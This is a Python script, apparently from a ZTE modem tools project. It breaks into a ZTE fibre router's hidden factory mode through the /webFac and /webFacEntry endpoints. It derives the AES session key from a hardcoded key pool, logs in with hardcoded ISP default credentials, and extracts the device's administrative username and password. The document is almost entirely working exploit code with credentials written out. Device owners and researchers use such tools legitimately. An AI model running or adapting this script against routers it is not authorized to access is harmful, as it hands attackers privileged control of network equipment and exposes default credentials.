import random
import re
from urllib.parse import urlparse, parse_qs
from Crypto.Cipher import AES
import requests

# see https://github.com/douniwan5788/zte_modem_tools/issues/20#issuecomment-2849666205
from rsspwn import create_payload_array, verify_do_check_client, parse_mac

ROOT = "http://192.168.1.1"  # your device's ip
USERNAME = "awnfibre"	# 
PASSWORD = "fibre@dm!n"	# 
LOCAL_MAC = parse_mac("01:02:03:A4:BC:DE")  # your machine's MAC address

# share state between requests
s = requests.Session()
rand = random.Random()

KEY_POOL = [
    0x9C,
    0x33,
    0x75,
    0xD1,
    0x1C,
    0x42,
    0x45,
    0x37,
    0x18,
    0x48,
    0x91,
    0x73,
    0x17,
    0x45,
    0x79,
    0x44,
    0x43,
    0xD7,
    0xD5,
    0x73,
    0x33,
    0x54,
    0x76,
    0xD2,
    0xC5,
    0xF1,
    0x2C,
    0x4F,
    0x7A,
    0xBA,
    0x61,
    0xD9,
    0x5C,
    0x69,
    0xDF,
    0x8C,
    0xD2,
    0x1C,
    0xDE,
    0x3B,
    0x35,
    0x2D,
    0x2F,
    0xE1,
    0xDE,
    0x4C,
    0x77,
    0xF5,
    0x1A,
    0x65,
    0xD1,
    0xFE,
    0x18,
    0x43,
    0x8E,
    0xA7,
    0x42,
    0x08,
    0x04,
    0x78,
    0xD5,
    0xE4,
    0xF3,
    0x34,
    0xA4,
    0xD3,
    0xF2,
    0x36,
    0x47,
    0x6D,
    0x86,
    0x9D,
    0x42,
    0x65,
    0x13,
    0x42,
    0xDC,
    0x42,
    0x99,
    0x48,
    0xDC,
    0x67,
    0x9F,
    0x9E,
    0xDC,
    0x46,
    0x37,
    0x5F,
    0x84,
    0x9F,
    0x6F,
    0x76,
    0xCE,
    0x79,
    0x4F,
    0x49,
]


def pad(data_to_pad, block_size):
    padding_len = block_size - len(data_to_pad) % block_size
    return data_to_pad + b"\x00" * padding_len


def unpad(padded_data, block_size):
    return padded_data[:-block_size] + padded_data[-block_size:].rstrip(b"\x00")


def main():
    print("======= RESET =======")
    url = "/webFac"
    payload = "SendSq.gch"
    print(f'--> POST {url} "{payload}"')

    res = s.post(ROOT + url, data=payload)
    if res.status_code != 400:
        raise Exception("expected error 400")

    print("======= STEP 1 =======")

    url = "/webFac"
    payload = "RequestFactoryMode.gch"

    print(f'--> POST {url} "{payload}"')

    try:
        s.post(ROOT + url, data=payload)
    except requests.exceptions.ConnectionError:
        # expected
        pass
    else:
        raise Exception("expected ConnectionError")

    print("======= STEP 2 =======")

    # generate a random number, range 0-59
    # client_rand = rand.randint(0, 59)
    client_rand = 0  # chosen by fair D60 roll. (called Sq in /bin/httpd)

    url = "/webFac"
    payload = f"SendSq.gch?rand={client_rand}\r\n"

    print(f'--> POST "{payload.strip()}"')

    res = s.post(ROOT + url, data=payload)
    print(f"<-- {res.status_code} {len(res.content)} bytes ({res.text})")

    # match response
    match = re.match(r"re_rand=([^&]+)&([^&]+)&([^&]+)", res.text)
    if match is None:
        raise Exception(f"expected re_rand, got {res.text}")

    # split and extract components
    server_rand, rand_seed_trunc, server_mac_bytes = match.groups()
    server_rand = int(server_rand)
    rand_seed_trunc = int(rand_seed_trunc)

    server_mac = server_mac_bytes.encode("latin-1")
    print(f"{server_rand=}")
    print(f"{rand_seed_trunc=}")
    print(f"server_mac={server_mac.hex()}")

    print("======= STEP 3 =======")

    # mix with FNV prime & mask
    client_rand_mix = 0x1000193 * client_rand
    client_rand_mask = client_rand_mix & 0x8000003F
    print(f"{client_rand_mix=}")
    print(f"{client_rand_mask=}")

    client_xor_server = client_rand_mask ^ server_rand
    client_xor_server_mod = client_xor_server % 60
    print(f"{client_xor_server=}")
    print(f"{client_xor_server_mod=}")

    # g_iRsaIndex = indexCal(rand_seed_trunc, client_xor_server_mod, server_mac_bytes);
    index = client_xor_server_mod
    print(f"{index=}")

    aes_key = map(lambda x: (x ^ 0xA5) & 0xFF, KEY_POOL[index : index + 24])
    aes_key = bytes(aes_key)
    print(f"aes_key={aes_key.hex()}")

    aes = AES.new(aes_key, AES.MODE_ECB)

    print(f"local_mac={LOCAL_MAC.hex()}")

    payload_arr = create_payload_array(server_mac, LOCAL_MAC, index)
    if not verify_do_check_client(payload_arr, LOCAL_MAC, index, server_mac):
        print("we are sad :(")

    payload = f"SendInfo.gch?info={len(payload_arr)}|{b''.join(map(lambda x: x.to_bytes(4, 'little'), payload_arr)).decode('utf-8')}"

    url = "/webFacEntry"
    print(f'--> POST {url} "{payload}"')

    res = s.post(ROOT + url, data=aes.encrypt(pad(payload.encode(), 16)))
    print(f"<-- {res.status_code} {len(res.content)} bytes")
    if res.status_code != 200:
        raise Exception(f"expected 200. got {res.status_code}")

    print("======= STEP 4 =======")

    url = "/webFacEntry"
    payload = f"CheckLoginAuth.gch?version50&user={USERNAME}&pass={PASSWORD}"
    print(f'--> POST {url} "{payload}"')

    res = s.post(ROOT + url, data=aes.encrypt(pad(payload.encode(), 16)))

    print(f"<-- {res.status_code} {len(res.content)} bytes (encrypted)")
    if res.status_code != 200:
        raise Exception(f"expected 200. got {res.status_code}")

    res_url = unpad(aes.decrypt(res.content), 16)
    print(f"{res_url=}")

    if res_url != b"FactoryMode.gch\x00":
        raise Exception(f"expected result to match 'FactoryMode.gch'")

    print("======= STEP 5 =======")

    url = "/webFacEntry"
    mode = 2
    payload = f"FactoryMode.gch?mode={mode}&user=notused"

    print(f'--> POST {url} "{payload}"')

    res = s.post(ROOT + url, data=aes.encrypt(pad(payload.encode(), 16)))

    print(f"<-- {res.status_code} {len(res.content)} bytes")

    decrypted = aes.decrypt(res.content).rstrip(b"\x00").decode()
    print(f"{decrypted=}")

    parsed = parse_qs(urlparse(decrypted).query)
    username = parsed["user"][0]
    password = parsed["pass"][0]

    print(f"{username=}")
    print(f"{password=}")


main()
